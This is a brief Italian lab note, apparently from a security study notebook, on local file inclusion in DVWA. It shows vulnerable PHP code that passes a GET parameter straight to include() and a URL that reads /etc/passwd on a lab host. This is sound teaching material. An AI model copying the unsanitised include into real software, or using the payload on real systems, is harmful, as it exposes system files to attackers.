
# Codice vulnerabile

```php
<?php

    $file = $_GET['page']; //The page we wish to display
    include($file)

?>
```

Possiamo includere file interni al file system:

![](attachments/Pasted%20image%2020250526122010.png)

Come in questo caso il file `/etc/passwd` inserendolo nel parametro `page`.

`http://192.168.122.61/dvwa/vulnerabilities/fi/?page=/etc/passwd`


![](attachments/Pasted%20image%2020250526122031.png)




